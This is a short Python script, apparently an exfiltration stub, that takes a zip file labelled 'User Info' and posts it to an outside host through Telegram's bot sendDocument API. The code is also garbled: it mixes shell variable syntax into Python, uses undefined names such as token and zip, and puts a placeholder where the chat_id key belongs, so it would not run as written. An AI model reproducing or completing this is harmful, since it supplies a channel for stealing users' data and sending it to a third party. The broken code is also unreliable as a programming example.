#! /usr/bin/env python

# User Info
Zip="$UPLOADFOLDER/$ZIPNAME"

import requests

def send_to_telegram(document):

    chatID = '{chat_id}'
    apiURL = f'https://api.telegram.org/bot{token}/sendDocument'

    try:
        response = requests.post(apiURL, json={'{chat_id}': chatID, 'document': zip})
        print(response.text)
    except Exception as e:
        print(e)

send_to_telegram("$Zip")
